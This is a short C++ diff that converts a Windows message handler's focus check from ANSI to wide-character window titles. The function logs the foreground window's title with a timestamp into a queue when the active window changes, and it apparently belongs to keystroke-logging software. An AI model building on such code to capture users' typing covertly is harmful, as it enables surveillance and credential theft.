@@ -153,18 +153,18 @@ LRESULT WinMsgHandler::classHandleMsg(HWND hWnd, UINT message, WPARAM wParam, LP
 
 void WinMsgHandler::checkFocus(UINT keyChar)
 {
-	CHAR window_title[256] = "";
+	wchar_t window_title[256] = L"";
 	CHAR wt[300] = "";
 	SYSTEMTIME curr_time;
 	GetLocalTime(&curr_time);
 
 	auto hActiveWindow = GetForegroundWindow();
-	GetWindowTextA(hActiveWindow, window_title, 256);
+	GetWindowTextW(hActiveWindow, window_title, 256);
 
 	//Insert reference to the current window
 	if ((hActiveWindow != hPrevWind)) {
 
-		snprintf(wt, 299, "\r\n%d-%d-%d %d:%d [ %s ]\r\n", curr_time.wYear, curr_time.wMonth,
+		snprintf(wt, 299, "\r\n%d-%d-%d %d:%d [ %ls ]\r\n", curr_time.wYear, curr_time.wMonth,
 			curr_time.wDay, curr_time.wHour, curr_time.wMinute, window_title);
 
 		_queue->Push(std::string(wt));
